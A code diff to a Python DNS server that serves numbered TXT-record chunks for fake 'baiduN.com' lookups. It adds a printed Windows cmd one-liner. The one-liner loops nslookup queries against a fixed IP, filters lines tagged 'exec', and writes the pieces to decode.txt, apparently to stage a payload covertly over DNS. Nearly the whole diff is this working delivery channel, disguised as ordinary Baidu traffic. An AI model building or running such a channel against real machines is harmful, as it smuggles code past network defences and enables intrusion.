@@ -40,12 +40,15 @@ class DNSHandler(BaseRequestHandler):
             number = int(match.group(1))
         # 如果请求的是 baidu.com，则返回 TXT 记录
         
-        # if domain == f'baidu{i}.com.' and 
-        if request.q.qtype == QTYPE.TXT:
-            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(L[number])))
-            sock.sendto(reply.pack(), self.client_address)
-            print(f"Send {number+1}rd TXT Record Success")
+        # if domain == f'baidu{i}.com.' and
+        try: 
+            if request.q.qtype == QTYPE.TXT:
+                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(L[number])))
+                sock.sendto(reply.pack(), self.client_address)
+                print(f"Send {number+1}rd TXT Record Success")
+        except IndexError:
+            print("Done, Press Ctrl + C to Exit")
             # break
         # 如果请求的不是 baidu.com 或不是 TXT 记录，则返回 NXDOMAIN
         # else:
@@ -55,4 +58,15 @@ class DNSHandler(BaseRequestHandler):
 # 创建 DNS 服务器并监听 53 端口
 server = UDPServer(('0.0.0.0', 53), DNSHandler)
 print('DNS server started on port 53')
+print(f"""
+==========
+Please Change Your DNS Server IP:
+
+cmd /v:on /Q /c "for /l %i in (0,1,{len(L)}) do (set a= && set b= && for /f "tokens=*" %j in ('nslookup -qt^=TXT baidu%i.com 192.168.2.3 ^| findstr "exec"') do (set a=%j && echo !a:~5,-2! >> decode.txt))"
+
+=========
+""")
 server.serve_forever()
+
+
+
